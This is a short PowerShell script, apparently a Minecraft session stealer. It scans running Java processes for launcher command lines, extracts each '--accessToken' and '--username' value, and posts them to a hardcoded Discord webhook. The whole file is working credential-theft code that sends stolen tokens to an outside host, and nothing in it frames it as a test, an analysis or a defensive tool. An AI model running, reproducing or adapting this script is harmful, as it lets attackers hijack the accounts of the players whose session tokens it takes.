$webhookUrl = "https://discord.com/api/webhooks/1337864025819709500/TIKefolYUGcPqkvjCOas0CAR807fJ0JKVThYXMubxF5Oji7fr_P3XkyQ8PcWWnpOIMYM"

Get-CimInstance -Query "SELECT CommandLine FROM Win32_Process WHERE Name LIKE 'Java%' AND CommandLine LIKE '%accessToken%'" |
    Select-Object -ExpandProperty CommandLine |
    ForEach-Object {
        $accessToken = $null
        $username = $null

        if ($_ -match '--accessToken\s+(\S+)') {
            $accessToken = $matches[1]
        }
        if ($_ -match '--username\s+(\S+)') {
            $username = $matches[1]
        }

        if ($accessToken -and $username) {
            # Format the message for Discord
            $message = @"
> **AccessToken:** $accessToken
> **Username:** $username
"@

            Write-Output $message

            # Properly format the payload for Discord
            $payload = @{
                content = $message
            } | ConvertTo-Json -Depth 10

            # Send the payload to the Discord webhook
            Invoke-RestMethod -Uri $webhookUrl -Method Post -ContentType "application/json" -Body $payload
        }
    }
